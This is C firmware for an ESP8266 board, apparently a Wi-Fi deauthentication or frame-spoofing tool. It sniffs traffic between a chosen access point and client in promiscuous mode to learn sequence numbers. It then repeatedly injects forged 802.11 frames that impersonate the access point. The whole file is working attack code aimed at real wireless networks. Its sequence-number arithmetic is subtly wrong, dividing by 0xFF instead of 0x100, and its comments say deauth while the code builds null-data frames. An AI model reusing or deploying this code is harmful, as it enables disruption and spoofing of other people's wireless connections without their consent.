#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_config.h"
#include "user_interface.h"
#include "driver/uart.h"

#define user_procTaskPrio        0
#define user_procTaskQueueLen    1
os_event_t    user_procTaskQueue[user_procTaskQueueLen];
static volatile os_timer_t packet_timer;

// Channel to perform deauth
uint8_t channel = 1;

// Access point MAC to deauth
uint8_t ap[6] = {0x00,0x01,0x02,0x03,0x04,0x05};

// Client MAC to deauth
uint8_t client[6] = {0x06,0x07,0x08,0x09,0x0A,0x0B};

// Sequence number of a packet from AP to client
uint16_t seq_n = 0;

// Packet buffer
uint8_t packet_buffer[64];

/* ==============================================
 * Promiscous callback structures, see ESP manual
 * ============================================== */
 
struct RxControl {
    signed rssi:8;
    unsigned rate:4;
    unsigned is_group:1;
    unsigned:1;
    unsigned sig_mode:2;
    unsigned legacy_length:12;
    unsigned damatch0:1;
    unsigned damatch1:1;
    unsigned bssidmatch0:1;
    unsigned bssidmatch1:1;
    unsigned MCS:7;
    unsigned CWB:1;
    unsigned HT_length:16;
    unsigned Smoothing:1;
    unsigned Not_Sounding:1;
    unsigned:1;
    unsigned Aggregation:1;
    unsigned STBC:2;
    unsigned FEC_CODING:1;
    unsigned SGI:1;
    unsigned rxend_state:8;
    unsigned ampdu_cnt:8;
    unsigned channel:4;
    unsigned:12;
};
 
struct LenSeq {
    uint16_t length;
    uint16_t seq;
    uint8_t  address3[6];
};

struct sniffer_buf {
    struct RxControl rx_ctrl;
    uint8_t buf[36];
    uint16_t cnt;
    struct LenSeq lenseq[1];
};

struct sniffer_buf2{
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};

/* Prints a byte array
 *
 * buf -  reference to the data array to print from;
 * start - the offset to start printing from, usually 0;
 * len - the number of bytes to print;
 */
void ICACHE_FLASH_ATTR
print_bytes(uint8_t *buf, uint16_t start, uint16_t len) {
	int i;
	for (i = start; i < len; i++) {
		if (i > 0) os_printf(":");
		os_printf("%02X", buf[i]);
	}
}

/* Creates a packet.
 * 
 * buf - reference to the data array to write packet to;
 * client - MAC address of the client;
 * ap - MAC address of the acces point;
 * seq - sequence number of 802.11 packet;
 * 
 * Returns: size of the packet
 */
uint16_t create_packet(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq)
{
    int i=0;
    // The first byte stores 3 pieces of data
    // 4 bits for the subtype, 2 bits for the type, and 2 bits for the version
    // management deauth: 1100 0000 = 0xC0
    // data null: 0100 1000 = 0x48
    // Type: data
    // Subtype: null
    buf[0] = 0x48;

    // The second byte stores 8 frame control flags
    // For more info see https://dalewifisec.wordpress.com/2014/05/17/the-to-ds-and-from-ds-fields/
    buf[1] = 0x00;

    // Duration 0 msec, will be re-written by ESP
    buf[2] = 0x00;
    buf[3] = 0x00;

    // Destination
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    // BSS
    for (i=0; i<6; i++) buf[i+16] = ap[i];

    // Sequence number / fragment number
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;

    return 24;
}

/* Sends packets. */
void send_packet(void *arg)
{
    os_printf("\nSending packet seq_n = %d ...\n", seq_n/0x10);
    // Sequence number is increased by 16, see 802.11
    uint16_t size = create_packet(packet_buffer, client, ap, seq_n+0x10);
    int result = wifi_send_pkt_freedom(packet_buffer, size, 0);
    os_printf("%d = wifi_send_pkt_freedom(", result);
    print_bytes(packet_buffer, 0, size);
    os_printf(", %d, 0)\n", size);
}

/* Listens communication between AP and client */
static void ICACHE_FLASH_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{
    if (len == 12){
        struct RxControl *sniffer = (struct RxControl*) buf;
    } else if (len == 128) {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    } else {
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
        int i=0;
        // Check MACs
        for (i=0; i<6; i++) if (sniffer->buf[i+4] != client[i]) return;
        for (i=0; i<6; i++) if (sniffer->buf[i+10] != ap[i]) return;
        // Update sequence number
        seq_n = sniffer->buf[23] * 0xFF + sniffer->buf[22];
    }
}

void  ICACHE_FLASH_ATTR
callback_send_pkt_freedom(uint8 status)
{
    os_printf("[packet callback] %d\n", status);
}

void ICACHE_FLASH_ATTR
sniffer_system_init_done(void)
{
    // Set up promiscuous callback
    wifi_set_channel(1);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);

    os_printf("%d = wifi_register_send_pkt_freedom_cb()\n", wifi_register_send_pkt_freedom_cb(callback_send_pkt_freedom));
}

void ICACHE_FLASH_ATTR
user_init()
{
    uart_init(115200, 115200);
    os_printf("\n\nSDK version:%s\n", system_get_sdk_version());
    
    // Promiscuous works only with station mode
    wifi_set_opmode(STATION_MODE);
    
    // Set timer for sending packets
    os_timer_disarm(&packet_timer);
    os_timer_setfn(&packet_timer, (os_timer_func_t *) send_packet, NULL);
    os_timer_arm(&packet_timer, SEND_INTERVAL, 1);
    
    // Continue to 'sniffer_system_init_done'
    system_init_done_cb(sniffer_system_init_done);
}
